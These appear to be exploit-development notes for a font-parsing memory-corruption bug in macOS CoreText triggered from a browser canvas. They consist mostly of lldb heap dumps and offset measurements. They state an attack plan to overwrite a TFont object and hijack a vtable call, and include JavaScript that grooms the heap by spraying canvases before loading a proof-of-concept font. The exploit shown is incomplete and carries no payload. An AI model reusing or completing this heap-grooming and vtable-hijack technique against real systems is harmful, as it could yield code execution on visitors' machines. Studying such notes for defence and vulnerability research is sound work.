(lldbinit) p/x 0x7fe5ff420a90-0x7fe5ff420590
(long) $32 = 0x0000000000000500
```

again

```
(lldbinit) p/x 0x7fa27c72dd20-0x7fa27c72d820
(long) $16 = 0x0000000000000500
```

there is hope

```
(lldbinit) p/x 0x7fba623238b0-0x7fba62321ad0
(long) $22 = 0x0000000000001de0
```

nvm, the offset is quite volatile

---

call chain for vtable:

`TRunGlue::SetGlyphID<true>` --> `TStorageRange::ResetAdvance(TStorageRange*, oob offset, TFont*)` --> `TFont::GetUnsummedAdvancesForGlyphs` --> `GetUnscaledAdvances` --> vtable call

attack plan:
- replace tfont in trunglue
- `ResetAdvance` will be called with fake tfont
- vtable will call our own thing

cannot touch trunglue because it is on the stack
so, only way is to directly overwrite tfont
need to find a way to get predictable offset of tfont from glyphs

more sampling of tfont vs glyphs (&glyphs - &tfont):

```
(lldbinit) p/x 0x7fc07704fb10-$rdx
(unsigned long) $291 = 0x0000000000000c40
```

```
(lldbinit) p/x 0x7ff402d2c070-$rdx
(unsigned long) $291 = 0x0000000000000aa0
```

sometimes it is actually not very far

```
(lldbinit) p/x 0x7fdba9145150-$rdx
(unsigned long) $291 = 0x00000000000133e0
```

```
(lldbinit) p/x 0x7f84daf32190-$rdx
(unsigned long) $293 = 0x0000000000001270
```

```
(lldbinit) p/x 0x7fe80ec59e10-$rdx
(unsigned long) $293 = 0x00000000000008d0
```

next idea:
- do many canvas operations on non-poc font first
- then do poc
- see if poc font will be allocated after the canvas

```js
function start(wasm_func, memory) {
    var canvas = document.getElementById('canvas')
    for (var i = 0; i < 64; ++i) {
        var ctx = canvas.getContext('2d');
        ctx.fillText('من ويكيبيديا، الموسوعة الحرة', 400, 200);
    }
    ...
```

```
(lldbinit) p/x 0x7fb85784aff0-$rdx
(unsigned long) $293 = 0x0000000001a139d0
```

```
(lldbinit) p/x 0x7f92fc935c80-$rdx
(unsigned long) $283 = 0x0000000000103e30
```

there's a noticable distance away

```
(lldbinit) p/x 0x7fbb4dd72470-$rdx
(unsigned long) $293 = 0x000000000000d720
```

quite useless

next idea:

```js
function start(wasm_func, memory) {
    var bobrosses = [];
    for (var i = 0; i < 16; ++i) {
        var canvas = document.createElement('canvas');
        document.body.appendChild(canvas);
        var ctx = canvas.getContext('2d');
        ctx.fillText('من ويكيبيديا، الموسوعة الحرة', 400, 200);
        bobrosses.push(canvas);
    }

    for (var i = 0; i < 16; ++i) {
        document.body.removeChild(bobrosses.pop());
    }

    const pocFontFace = new FontFace("GeezaPro", "url(poc.ttf)")

    var canvas = document.createElement('canvas')
    canvas.setAttribute("style", "font-family: GeezaPro; -webkit-font-smoothing: none;")
    document.body.appendChild(canvas)

    ...
```

```
(lldbinit) p/x 0x7f9330f3bd30-$rdx
(unsigned long) $296 = 0x00000000000005b0
```

```
(lldbinit) p/x 0x7ff10e6283e0-$rdx
(unsigned long) $292 = 0x0000000000000b40
```

```
(lldbinit) p/x 0x7f9fc1637660-$rdx
(unsigned long) $293 = 0x00000000000007e0
```

```
(lldbinit) p/x 0x7ff433825240-$rdx
(unsigned long) $292 = 0x0000000000000650
```

```
(lldbinit) p/x 0x7fa67dc516d0-$rdx
(unsigned long) $292 = 0x00000000000012f0
```

```
(lldbinit) p/x 0x7f92a1f52af0-$rdx
(unsigned long) $292 = 0x0000000000000500
```

```
(lldbinit) p/x 0x7ffd63d368a0-$rdx
(unsigned long) $292 = 0x0000000000000b30
```

looks like the difference is somewhat related to the js code
and now it is quite contained within 0x1000
but still cant tell how it works

```
(lldbinit) p/x 0x7fef24142620-$rdx
(unsigned long) $292 = 0x0000000000000500
```

```
(lldbinit) p/x 0x7fa737462640-$rdx
(unsigned long) $292 = 0x0000000000000500
```

```
(lldbinit) p/x 0x7fcbb4533970-$rdx
(unsigned long) $292 = 0x00000000000008c0
```

```
(lldbinit) p/x 0x7fec32436c60-$rdx
(unsigned long) $292 = 0x0000000000000d70
```

wonder how is it for the ones that are being sprayed

```
(lldbinit) p/x $rdx-0x7fd578761000
(unsigned long) $9 = 0x0000000000007750
```

```
(lldbinit) p/x 0x7f8c04333e90-$rdx
(unsigned long) $9 = 0x0000000000006be0
```

```
(lldbinit) p/x $rdx-0x7f8c0244d100
(unsigned long) $9 = 0x0000000001ee01b0
```

```
(lldbinit) p/x 0x7f933502ef90-$rdx
(unsigned long) $8 = 0x0000000000000c00
```

```
(lldbinit) p/x 0x7fdfdd740210-$rdx
(unsigned long) $8 = 0x00000000000009a0
```

```
(lldbinit) p/x 0x7fd1e4c40590-$rdx
(unsigned long) $8 = 0x0000000000001330
```

```
(lldbinit) p/x 0x7f9c6db408b0-$rdx
(unsigned long) $9 = 0xfffffffffffffa90
```

```
(lldbinit) p/x 0x7f8a0ae4ce30-$rdx
(unsigned long) $12 = 0x0000000000000500
```

```
(lldbinit) p/x 0x7fbee251f1e0-$rdx
(unsigned long) $8 = 0x00000000001dd9b0
```

more volatile

on the other hand, got `0x5b0` 3 times in a row for the poc font, and another `0x660`

feels possible to control offset but need to try harder

```
(lldbinit) x/372gx --force $rdx
0x7fbee2221570: 0x0000000000000010 0x00007fbee22214e0
0x7fbee2221580: 0x4038000000000000 0x0000000000000000
0x7fbee2221590: 0x0000000000000000 0x0000000000000000
0x7fbee22215a0: 0x40357b9000000000 0x401fc4a000000000
0x7fbee22215b0: 0x400a0a0000000000 0xaaaaaaaa000008a4
0x7fbee22215c0: 0x3f86387a36a02c71 0x3f86387a36a02c71
0x7fbee22215d0: 0xc003e08552dd47c1 0xc02dc5b000000000
0x7fbee22215e0: 0x40639ddbe439673c 0x4045c96000000000
0x7fbee22215f0: 0x0000000000000000 0x3f86387a36a02c71
0x7fbee2221600: 0x0000000000000000 0x00007fbee2221a60
0x7fbee2221610: 0x0000000000000000 0x00007fbee2221620
0x7fbee2221620: 0x0000000000000000 0x0000000000000000
0x7fbee2221630: 0x0000000000000000 0x0000000000000000
0x7fbee2221640: 0x0000000000000000 0x0000000000000000
0x7fbee2221650: 0x0000000000000000 0x000000003f800000
0x7fbee2221660: 0x0000000000000000 0x0000000000000000
0x7fbee2221670: 0x0000000000000000 0x0000000000000000
0x7fbee2221680: 0x000000003f800000 0x0000000000000000
0x7fbee2221690: 0x00007fbee22217d0 0x00007fbee300da00
0x7fbee22216a0: 0x0000000000000000 0x0000000000000000
0x7fbee22216b0: 0x0000000000000000 0x0000000000000000
0x7fbee22216c0: 0x00007fbee3015000 0x0000000000000000
0x7fbee22216d0: 0x00007fbee221b4a0 0x4038000000000000
0x7fbee22216e0: 0x0000000000000000 0x0000000000000000
0x7fbee22216f0: 0x0000000000000000 0x0000000000000000
0x7fbee2221700: 0x0000000000000000 0x0000000000000000
0x7fbee2221710: 0x0000000000000000 0x0000000000000000
0x7fbee2221720: 0x0000000000000000 0x000000003f800000
0x7fbee2221730: 0x0000000000000000 0x0000000000000000
0x7fbee2221740: 0x0000000000000000 0x0000000000000000
0x7fbee2221750: 0x0000000000000000 0x0000000000000000
0x7fbee2221760: 0xd000000000000000 0xd000000000000000
0x7fbee2221770: 0x0000000000000007 0x00007ffee471abb0
0x7fbee2221780: 0x00000005fe0a1490 0x00000005fe0a1570
0x7fbee2221790: 0x00007fff87254c38 0x00007fbee300da00
0x7fbee22217a0: 0x0000000000000000 0x0000000000000000
0x7fbee22217b0: 0x00007fbee2221790 0xd000000000000000
0x7fbee22217c0: 0x0000000000000000 0x0007000000000000
0x7fbee22217d0: 0x011dffff80181701 0x0000000200001480
0x7fbee22217e0: 0x0000000000002000 0x0000000000002000
0x7fbee22217f0: 0x00007fff8077ec40 0x00007fbee300da00
0x7fbee2221800: 0x011dffff80181521 0x000000010000078c
0x7fbee2221810: 0x5020617a65654711 0x6c75676552206f72
0x7fbee2221820: 0x0000000000007261 0x0000000000000000
0x7fbee2221830: 0x00007fbee2210e60 0x00007fbee2210e60
0x7fbee2221840: 0x0000000000000001 0x3ff0000000000000
0x7fbee2221850: 0x0000000000000000 0x0000000000000000
0x7fbee2221860: 0x3ff0000000000000 0x0000000000000000
0x7fbee2221870: 0x0000000000000000 0x00007fbee23385f0
0x7fbee2221880: 0xffdfffffffffffff 0xffdfffffffffffff
0x7fbee2221890: 0x7fefffffffffffff 0x7fefffffffffffff
0x7fbee22218a0: 0x0000000000000000 0x00007fbee22218f0
0x7fbee22218b0: 0x0000000000000000 0x00007fbee22211f0
0x7fbee22218c0: 0x0000000000000000 0x00007fbee2221980
0x7fbee22218d0: 0x0000000000000001 0x00007fbee0756790
0x7fbee22218e0: 0x0000000000000001 0x00007fbee0756760
0x7fbee22218f0: 0x0000000000000001 0xb00007fb00000000
0x7fbee2221900: 0xffdfffffffffffff 0xffdfffffffffffff
0x7fbee2221910: 0x7fefffffffffffff 0x7fefffffffffffff
0x7fbee2221920: 0xffdfffffffffffff 0xffdfffffffffffff
0x7fbee2221930: 0x7fefffffffffffff 0x7fefffffffffffff
0x7fbee2221940: 0xffdfffffffffffff 0xffdfffffffffffff
0x7fbee2221950: 0x7fefffffffffffff 0x7fefffffffffffff
0x7fbee2221960: 0x0000000000000000 0x0000000000000000
0x7fbee2221970: 0x0000000000000000 0x0000000000000000
0x7fbee2221980: 0x0000000100000000 0x0000000000000000
0x7fbee2221990: 0x0000000000000000 0x4024000000000000
0x7fbee22219a0: 0x0000000000000000 0xd000000000000000
0x7fbee22219b0: 0x0000000000000000 0x00007fbee23385f0
0x7fbee22219c0: 0x011dffff80181201 0x0400000000000003
0x7fbee22219d0: 0x00007fff872726b8 0x455cd7a72980146d
0x7fbee22219e0: 0x00007fff87272698 0x455cd7a729800d0d
0x7fbee22219f0: 0x00007fff87272418 0x45b4d79e0b514fbf
0x7fbee2221a00: 0x011dffff8054bce1 0x0000000100010180
0x7fbee2221a10: 0x0000000000000000 0x00007fff21a619e8
0x7fbee2221a20: 0x0000000000000000 0x00007fbee2221a30
0x7fbee2221a30: 0x00007fff87254f98 0x00007fbee22219c0
0x7fbee2221a40: 0x0000000080010000 0x0000000000000000
0x7fbee2221a50: 0x00007fbee221b4a0 0x0000000000000000
0x7fbee2221a60: 0x011dffff80182381 0x00007fbee2221440
0x7fbee2221a70: 0x0400000100000003 0x0000000000000000
0x7fbee2221a80: 0x011dffff8054bce1 0x0000000100010180
0x7fbee2221a90: 0x0000000000000000 0x00007fff21a619e8
0x7fbee2221aa0: 0x0000000000000000 0x00007fbee2221ab0
0x7fbee2221ab0: 0x00007fff87254f98 0x00007fbee2221d00
0x7fbee2221ac0: 0x0000000080010000 0x0000000000000000
0x7fbee2221ad0: 0x00007fbee221b4a0 0x0000000000000000
0x7fbee2221ae0: 0x011dffff8054bcb9 0x0000000100010280
0x7fbee2221af0: 0x0000000000000000 0x00007fff21a71054
0x7fbee2221b00: 0x0000000000000000 0x00007fbee2221b10
0x7fbee2221b10: 0x0000000000000010 0x00007fbee2221a80
0x7fbee2221b20: 0x4038000000000000 0x0000000000000000
0x7fbee2221b30: 0x0000000080000000 0x0000000000000000
0x7fbee2221b40: 0x40357b9000000000 0x401fc4a000000000
0x7fbee2221b50: 0x400a0a0000000000 0xaaaaaaaa000008a4
0x7fbee2221b60: 0x3f86387a36a02c71 0x3f86387a36a02c71
0x7fbee2221b70: 0xc003e08552dd47c1 0xc02dc5b000000000
0x7fbee2221b80: 0x40639ddbe439673c 0x4045c96000000000
0x7fbee2221b90: 0x0000000000000000 0x3f86387a36a02c71
0x7fbee2221ba0: 0x0000000000000000 0x0000000000000000
0x7fbee2221bb0: 0x0000000000000000 0x00007fbee2221bc0
0x7fbee2221bc0: 0x0000000000000000 0x0000000000000000
0x7fbee2221bd0: 0x0000000000000000 0x0000000000000000
0x7fbee2221be0: 0x0000000000000000 0x0000000000000000
0x7fbee2221bf0: 0x0000000000000000 0x000000003f800000
0x7fbee2221c00: 0x0000000000000000 0x0000000000000000
0x7fbee2221c10: 0x0000000000000000 0x0000000000000000
0x7fbee2221c20: 0x000000003f800000 0x0000000000000000
0x7fbee2221c30: 0x0000000000000000 0x0000000000000000
0x7fbee2221c40: 0x0000000000000000 0x0000000000000000
0x7fbee2221c50: 0x0000000000000000 0x0000000000000000
0x7fbee2221c60: 0x0000000000000000 0x0000000000000000
0x7fbee2221c70: 0x00007fbee221b4a0 0x4038000000000000
0x7fbee2221c80: 0x0000000000000000 0x0000000000000000
0x7fbee2221c90: 0x0000000000000000 0x0000000000000000
0x7fbee2221ca0: 0x0000000000000000 0x0000000000000000
0x7fbee2221cb0: 0x0000000000000000 0x0000000000000000
0x7fbee2221cc0: 0x0000000000000000 0x000000003f800000
0x7fbee2221cd0: 0x0000000000000000 0x0000000000000000
0x7fbee2221ce0: 0x0000000000000000 0x0000000000000000
0x7fbee2221cf0: 0x00007fbee2221a00 0x0000000000000000
0x7fbee2221d00: 0x011dffff80181201 0x0400000000000001
0x7fbee2221d10: 0x0000000000000000 0x0000000000000000
0x7fbee2221d20: 0x0000000000000000 0x0000000000000000
0x7fbee2221d30: 0x00007fff87272418 0x45b4d79e0b514fbf
0x7fbee2221d40: 0x00007fbee233ea80 0x500007fbee221c01
0x7fbee2221d50: 0x00007fff87253f38 0x0000000000000000
0x7fbee2221d60: 0x0000000000000000 0x00007fff8725bf00
0x7fbee2221d70: 0x000000000000001c 0x0000000600866064
0x7fbee2221d80: 0x00007ffee471b6e8 0x0000000000000000
0x7fbee2221d90: 0x00007fbee2221da8 0x00007fbee2221dc0
0x7fbee2221da0: 0x00007fbee2221dc0 0x000000000000001c
0x7fbee2221db0: 0x0000000600866064 0x00007fbee2221470
0x7fbee2221dc0: 0x0000000000000000 0x0000000000000000
0x7fbee2221dd0: 0x0000000000000000 0x0000000000000000
0x7fbee2221de0: 0x0000000000000000 0x0000000000000000
0x7fbee2221df0: 0x00007fbee2221dc0 0x0000000000000000
0x7fbee2221e00: 0x4020d13e7ed7b9a3 0x0000000000000000
0x7fbee2221e10: 0x402392bfa71e1726 0x0000000000000000
0x7fbee2221e20: 0x402c094232ec1813 0x0000000000000000
0x7fbee2221e30: 0x4026ce776f90e59d 0x0000000000000000
0x7fbee2221e40: 0x401c145e70076829 0x0000000000000000
0x7fbee2221e50: 0x401df21cb39ddbe4 0x0000000000000000
0x7fbee2221e60: 0x4020d13e7ed7b9a3 0x0000000000000000
0x7fbee2221e70: 0x402c094232ec1813 0x0000000000000000
0x7fbee2221e80: 0x4022d5df984dc5ac 0x0000000000000000
0x7fbee2221e90: 0x4035e7ed7b9a27d0 0x0000000000000000
0x7fbee2221ea0: 0x4022d5df984dc5ac 0x0000000000000000
0x7fbee2221eb0: 0x0000000000000000 0x0000000000000000
0x7fbee2221ec0: 0x0000000000000000 0x0000000000000000
0x7fbee2221ed0: 0x401c145e70076829 0x0000000000000000
0x7fbee2221ee0: 0x401df21cb39ddbe4 0x0000000000000000
0x7fbee2221ef0: 0x401c145e70076829 0x0000000000000000
0x7fbee2221f00: 0x401c145e70076829 0x0000000000000000
0x7fbee2221f10: 0x402ebfa71e17257f 0x0000000000000000
0x7fbee2221f20: 0x402392bfa71e1726 0x0000000000000000
0x7fbee2221f30: 0x0000000000000000 0x0000000000000000
0x7fbee2221f40: 0x0000000000000000 0x0000000000000000
0x7fbee2221f50: 0x0000000000000000 0x0000000000000000
0x7fbee2221f60: 0x402a25f5d0c7fc4c 0x0000000000000000
0x7fbee2221f70: 0x402ebfa71e17257f 0x0000000000000000
0x7fbee2221f80: 0x4022d5df984dc5ac 0x0000000000000000
0x7fbee2221f90: 0x401df21cb39ddbe4 0x0000000000000000
0x7fbee2221fa0: 0x40299b14d4f29336 0x0000000000000000
0x7fbee2221fb0: 0x402387a36a02c70f 0x0000000000000000
0x7fbee2221fc0: 0x000000000000001b 0x000000000000001a
0x7fbee2221fd0: 0x0000000000000019 0x0000000000000018
0x7fbee2221fe0: 0x0000000000000017 0x0000000000000016
0x7fbee2221ff0: 0x0000000000000015 0x0000000000000014
0x7fbee2222000: 0x0000000000000013 0x0000000000000012
0x7fbee2222010: 0x0000000000000011 0x0000000000000010
0x7fbee2222020: 0x000000000000000f 0x000000000000000e
0x7fbee2222030: 0x000000000000000d 0x000000000000000c
0x7fbee2222040: 0x000000000000000b 0x000000000000000a
0x7fbee2222050: 0x0000000000000009 0x0000000000000008
0x7fbee2222060: 0x0000000000000007 0x0000000000000006
0x7fbee2222070: 0x0000000000000005 0x0000000000000004
0x7fbee2222080: 0x0000000000000003 0x0000000000000002
0x7fbee2222090: 0x0000000000000001 0x0000000000000000
0x7fbee22220a0: 0x0000081000000000 0x0000081000000810
0x7fbee22220b0: 0x0000000100000000 0x0000081000000810
0x7fbee22220c0: 0x0000081000000810 0x9100081800000810
0x7fbee22220d0: 0x00000000b1000818 0x0000000000000001
0x7fbee22220e0: 0x0000081000000810 0x3100081800000810
0x7fbee22220f0: 0x7100081851000818 0x0000081000000810
0x7fbee2222100: 0x0000000100000000 0x0000081000000810
```

non-poc font:

```
tfont: 7fec2d44a120
glyphs: 7fec2d44b9e0
MALLOC_TINY              [0x00007FEC2D400000 - 0x00007FEC2D500000) - rw-/rwx SM=PRV DefaultMallocZone_0x1000b6000
MALLOC_TINY              [0x00007FEC2D400000 - 0x00007FEC2D500000) - rw-/rwx SM=PRV DefaultMallocZone_0x1000b6000
glyphs-tfont: 18c0
```

poc font:

```
(lldbinit) bbb
tfont: 7fec2d743ba0
glyphs: 7fec2d7446c0
MALLOC_TINY              [0x00007FEC2D700000 - 0x00007FEC2D800000) - rw-/rwx SM=PRV DefaultMallocZone_0x1000b6000
MALLOC_TINY              [0x00007FEC2D700000 - 0x00007FEC2D800000) - rw-/rwx SM=PRV DefaultMallocZone_0x1000b6000
glyphs-tfont: b20
```

```
0x7fec2d743ba0: 0x0000000000000010 0x00007fec2d743b10
0x7fec2d743bb0: 0x4038000000000000 0x0000000000000000
0x7fec2d743bc0: 0x0000000000000000 0x0000000000000000
0x7fec2d743bd0: 0x40357b9000000000 0x401fc4a000000000
0x7fec2d743be0: 0x400a0a0000000000 0xaaaaaaaa000008a4
0x7fec2d743bf0: 0x3f86387a36a02c71 0x3f86387a36a02c71
0x7fec2d743c00: 0xc003e08552dd47c1 0xc02dc5b000000000
0x7fec2d743c10: 0x40639ddbe439673c 0x4045c96000000000
0x7fec2d743c20: 0x0000000000000000 0x3f86387a36a02c71
0x7fec2d743c30: 0x0000000000000000 0x00007fec2d7442e0
0x7fec2d743c40: 0x0000000000000000 0x00007fec2d743c50
0x7fec2d743c50: 0x0000000000000000 0x0000000000000000
0x7fec2d743c60: 0x0000000000000000 0x0000000000000000
0x7fec2d743c70: 0x0000000000000000 0x0000000000000000
0x7fec2d743c80: 0x0000000000000000 0x000000003f800000
0x7fec2d743c90: 0x0000000000000000 0x0000000000000000
0x7fec2d743ca0: 0x0000000000000000 0x0000000000000000
0x7fec2d743cb0: 0x000000003f800000 0x0000000000000000
0x7fec2d743cc0: 0x00007fec2d744b30 0x00007fec2f06f000
0x7fec2d743cd0: 0x0000000000000000 0x0000000000000000
0x7fec2d743ce0: 0x0000000000000000 0x0000000000000000
0x7fec2d743cf0: 0x00007fec2f031800 0x0000000000000000
0x7fec2d743d00: 0x00007fec2d7408a0 0x4038000000000000
0x7fec2d743d10: 0x0000000000000000 0x0000000000000000
0x7fec2d743d20: 0x0000000000000000 0x0000000000000000
0x7fec2d743d30: 0x0000000000000000 0x0000000000000000
0x7fec2d743d40: 0x0000000000000000 0x0000000000000000
0x7fec2d743d50: 0x0000000000000000 0x000000003f800000
0x7fec2d743d60: 0x0000000000000000 0x0000000000000000
0x7fec2d743d70: 0x0000000000000000 0x0000000000000000
0x7fec2d743d80: 0x0000000000000000 0x0000000000000000
0x7fec2d743d90: 0x011dffff80181521 0x000000010000078c
0x7fec2d743da0: 0x5020617a65654711 0x6c75676552206f72
0x7fec2d743db0: 0x0000000000007261 0x0000000000000000
0x7fec2d743dc0: 0x00007fff80181cf0 0x0000000100000200
0x7fec2d743dd0: 0x00007fff205e2a92 0x00007fff205e2a95
0x7fec2d743de0: 0x00007fff205e2a9c 0x00007fff205e2acb
0x7fec2d743df0: 0x00007fff205e2b11 0x00007fff205e2b16
0x7fec2d743e00: 0x00007fff205e2b4b 0x00007fff20874660
0x7fec2d743e10: 0x0000000000000000 0x0000000000000000
0x7fec2d743e20: 0x00007fff8077f5d0 0x0000000000000006
0x7fec2d743e30: 0x0000000000000000 0x0000000000000000
0x7fec2d743e40: 0x00007fff8077eb70 0x0000000000000000
0x7fec2d743e50: 0x00007fec2d73d4f0 0x0000000000000000
0x7fec2d743e60: 0x0000000000000000 0x0000000000000000
0x7fec2d743e70: 0x0000000000000000 0x0000000000000000
0x7fec2d743e80: 0x00007fff285f9c7a 0x0000000000000000
0x7fec2d743e90: 0x00007fff80181cf0 0x0000000100000200
0x7fec2d743ea0: 0x00007fff205e2a92 0x00007fff205e2a95
0x7fec2d743eb0: 0x00007fff205e2a9c 0x00007fff205e2acb
0x7fec2d743ec0: 0x00007fff205e2b11 0x00007fff205e2b16
0x7fec2d743ed0: 0x00007fff205e2b4b 0x00007fff20874660
0x7fec2d743ee0: 0x0000000000000000 0x0000000000000000
0x7fec2d743ef0: 0x00007fff8077f5d0 0x0000000000000006
0x7fec2d743f00: 0x0000000000000000 0x0000000000000000
0x7fec2d743f10: 0x00007fff8077eb70 0x0000000000000000
0x7fec2d743f20: 0x00007fec2d73d4f0 0x0000000000000000
0x7fec2d743f30: 0x0000000000000000 0x0000000000000000
0x7fec2d743f40: 0x0000000000000000 0x0000000000000000
0x7fec2d743f50: 0x00007fff285f9c7a 0x0000000000000000
0x7fec2d743f60: 0x011dffff80181701 0x0000000100001480
0x7fec2d743f70: 0x0000000000000036 0x0000000000000036
0x7fec2d743f80: 0x00007fec2d743e90 0x0000000468032b14
0x7fec2d743f90: 0x011dffff80181cf1 0x0000000100012c80
0x7fec2d743fa0: 0x0000000000000000 0x0000000000000000
0x7fec2d743fb0: 0x0000000000000000 0x0000000000000000
0x7fec2d743fc0: 0x0000000000000000 0x0000000000000000
0x7fec2d743fd0: 0x0000000000000000 0x0000000000000000
0x7fec2d743fe0: 0x00000001031e4ae0 0x00000001031e3e50
0x7fec2d743ff0: 0x0000000000000000 0x0000000000000000
0x7fec2d744000: 0x0000000000000000 0x0000000000000000
0x7fec2d744010: 0x0000000000000000 0x0000000000000000
0x7fec2d744020: 0x0000000000000000 0x0000000000000000
0x7fec2d744030: 0x0000000000000000 0x0000000000000000
0x7fec2d744040: 0x0000000000000000 0x0000000000000000
0x7fec2d744050: 0x00000001031e3b80 0x00000001031e3cd0
0x7fec2d744060: 0x0000000000000000 0x0000000000000000
0x7fec2d744070: 0x0000000000000000 0x0000000000000000
0x7fec2d744080: 0x0000000000000000 0x0000000000000000
0x7fec2d744090: 0x0000000000000000 0x0000000460a86150
0x7fec2d7440a0: 0x011dffff80181cf1 0x0000000100012b80
0x7fec2d7440b0: 0x0000003d43545854 0x0000000000000000
0x7fec2d7440c0: 0x0000000000000000 0x00007fec2d743f90
0x7fec2d7440d0: 0x0000000000000000 0x0000000000000000
0x7fec2d7440e0: 0x0000000000000000 0x0000000000000000
0x7fec2d7440f0: 0x0000000000000000 0x0000000000000000
0x7fec2d744100: 0x00007fec2d7441c0 0x00007fec2d720500
0x7fec2d744110: 0x00007fec2d744160 0x3ff0000000000000
0x7fec2d744120: 0x0000000000000000 0x0000000000000000
0x7fec2d744130: 0x3ff0000000000000 0x0000000000000000
0x7fec2d744140: 0x0000000000000000 0x0000000000000000
0x7fec2d744150: 0x0000000000000000 0x0000000000000000
0x7fec2d744160: 0x9000000000000001 0x4052000000000000
0x7fec2d744170: 0x4052000000000000 0x3ff0000000000000
0x7fec2d744180: 0x0000000000000000 0x0000000000000000
0x7fec2d744190: 0x3ff0000000000000 0x0000000000000000
0x7fec2d7441a0: 0x0000000000000000 0x0000000000000000
0x7fec2d7441b0: 0x0001010101010101 0x0000000100030001
0x7fec2d7441c0: 0x00007fec2d720500 0x00007fec2d720500
0x7fec2d7441d0: 0x0000000000000001 0x3ff0000000000000
0x7fec2d7441e0: 0x0000000000000000 0x0000000000000000
0x7fec2d7441f0: 0x3ff0000000000000 0x0000000000000000
0x7fec2d744200: 0x0000000000000000 0x00007fec2e32c8c0
0x7fec2d744210: 0xffdfffffffffffff 0xffdfffffffffffff
0x7fec2d744220: 0x7fefffffffffffff 0x7fefffffffffffff
0x7fec2d744230: 0x0000000000000000 0x00007fec2d7435e0
0x7fec2d744240: 0x0000000000000000 0x00007fec2d744280
0x7fec2d744250: 0x0000000000000000 0x00007fec2d743670
0x7fec2d744260: 0x0000000000000001 0x00007fec2e315e00
0x7fec2d744270: 0x0000000000000001 0x00007fec2e328b90
0x7fec2d744280: 0x0000000000000001 0x3ff0000000000000
0x7fec2d744290: 0x0000000000000002 0x0000000000000000
0x7fec2d7442a0: 0x0000000000000000 0x0000000000000000
0x7fec2d7442b0: 0x0000000300000002 0x0000000100000000
0x7fec2d7442c0: 0x0000000000000000 0x0000000000000000
0x7fec2d7442d0: 0x00007fec2d44a310 0xe00007fec2d70a01
0x7fec2d7442e0: 0x011dffff80182381 0x00007fec2d743a70
0x7fec2d7442f0: 0x0400000100000003 0x0000000000000000
0x7fec2d744300: 0x00007fff87253f38 0x0000000000000000
0x7fec2d744310: 0x0000000000000000 0x00007fff8725bf00
0x7fec2d744320: 0x000000000000001c 0x00000004684ff604
0x7fec2d744330: 0x00007ffeefade6d8 0x0000000000000000
0x7fec2d744340: 0x00007fec2d744358 0x00007fec2d744370
0x7fec2d744350: 0x00007fec2d744370 0x000000000000001c
0x7fec2d744360: 0x00000004684ff604 0x00007fec2d743aa0
0x7fec2d744370: 0x0000000000000000 0x0000000000000000
0x7fec2d744380: 0x0000000000000000 0x0000000000000000
0x7fec2d744390: 0x0000000000000000 0x0000000000000000
0x7fec2d7443a0: 0x00007fec2d744370 0x0000000000000000
0x7fec2d7443b0: 0x4020d13e7ed7b9a3 0x0000000000000000
0x7fec2d7443c0: 0x402392bfa71e1726 0x0000000000000000
0x7fec2d7443d0: 0x402c094232ec1813 0x0000000000000000
0x7fec2d7443e0: 0x4026ce776f90e59d 0x0000000000000000
0x7fec2d7443f0: 0x401c145e70076829 0x0000000000000000
0x7fec2d744400: 0x401df21cb39ddbe4 0x0000000000000000
0x7fec2d744410: 0x4020d13e7ed7b9a3 0x0000000000000000
0x7fec2d744420: 0x402c094232ec1813 0x0000000000000000
0x7fec2d744430: 0x4022d5df984dc5ac 0x0000000000000000
0x7fec2d744440: 0x4035e7ed7b9a27d0 0x0000000000000000
0x7fec2d744450: 0x4022d5df984dc5ac 0x0000000000000000
0x7fec2d744460: 0x0000000000000000 0x0000000000000000
0x7fec2d744470: 0x0000000000000000 0x0000000000000000
0x7fec2d744480: 0x401c145e70076829 0x0000000000000000
0x7fec2d744490: 0x401df21cb39ddbe4 0x0000000000000000
0x7fec2d7444a0: 0x401c145e70076829 0x0000000000000000
0x7fec2d7444b0: 0x401c145e70076829 0x0000000000000000
0x7fec2d7444c0: 0x402ebfa71e17257f 0x0000000000000000
0x7fec2d7444d0: 0x402392bfa71e1726 0x0000000000000000
0x7fec2d7444e0: 0x0000000000000000 0x0000000000000000
0x7fec2d7444f0: 0x0000000000000000 0x0000000000000000
0x7fec2d744500: 0x0000000000000000 0x0000000000000000
0x7fec2d744510: 0x402a25f5d0c7fc4c 0x0000000000000000
0x7fec2d744520: 0x402ebfa71e17257f 0x0000000000000000
0x7fec2d744530: 0x4022d5df984dc5ac 0x0000000000000000
0x7fec2d744540: 0x401df21cb39ddbe4 0x0000000000000000
0x7fec2d744550: 0x40299b14d4f29336 0x0000000000000000
0x7fec2d744560: 0x402387a36a02c70f 0x0000000000000000
0x7fec2d744570: 0x000000000000001b 0x000000000000001a
0x7fec2d744580: 0x0000000000000019 0x0000000000000018
0x7fec2d744590: 0x0000000000000017 0x0000000000000016
0x7fec2d7445a0: 0x0000000000000015 0x0000000000000014
0x7fec2d7445b0: 0x0000000000000013 0x0000000000000012
0x7fec2d7445c0: 0x0000000000000011 0x0000000000000010
0x7fec2d7445d0: 0x000000000000000f 0x000000000000000e
0x7fec2d7445e0: 0x000000000000000d 0x000000000000000c
0x7fec2d7445f0: 0x000000000000000b 0x000000000000000a
0x7fec2d744600: 0x0000000000000009 0x0000000000000008
0x7fec2d744610: 0x0000000000000007 0x0000000000000006
0x7fec2d744620: 0x0000000000000005 0x0000000000000004
0x7fec2d744630: 0x0000000000000003 0x0000000000000002
0x7fec2d744640: 0x0000000000000001 0x0000000000000000
0x7fec2d744650: 0x0000081000000000 0x0000081000000810
0x7fec2d744660: 0x0000000100000000 0x0000081000000810
0x7fec2d744670: 0x0000081000000810 0x9100081800000810
0x7fec2d744680: 0x00000000b1000818 0x0000000000000001
0x7fec2d744690: 0x0000081000000810 0x3100081800000810
0x7fec2d7446a0: 0x7100081851000818 0x0000081000000810
0x7fec2d7446b0: 0x0000000100000000 0x0000081000000810
0x7fec2d7446c0: 0x01550106011100f6 0x012d00f7000300f0
0x7fec2d7446d0: 0x0001016501150165 0x0037000300f00001
```

```
tfont: 7ff7ce523b40
glyphs: 7ff7ce5198f0
MALLOC_TINY              [0x00007FF7CE500000 - 0x00007FF7CE600000) - rw-/rwx SM=PRV DefaultMallocZone_0x103b86000
MALLOC_TINY              [0x00007FF7CE500000 - 0x00007FF7CE600000) - rw-/rwx SM=PRV DefaultMallocZone_0x103b86000
glyphs-tfont: -a250
```

```
(lldbinit) bbb
tfont: 7ff7ce36e000
glyphs: 7ff7ce36e5b0
MALLOC_TINY              [0x00007FF7CE300000 - 0x00007FF7CE400000) - rw-/rwx SM=PRV DefaultMallocZone_0x103b86000
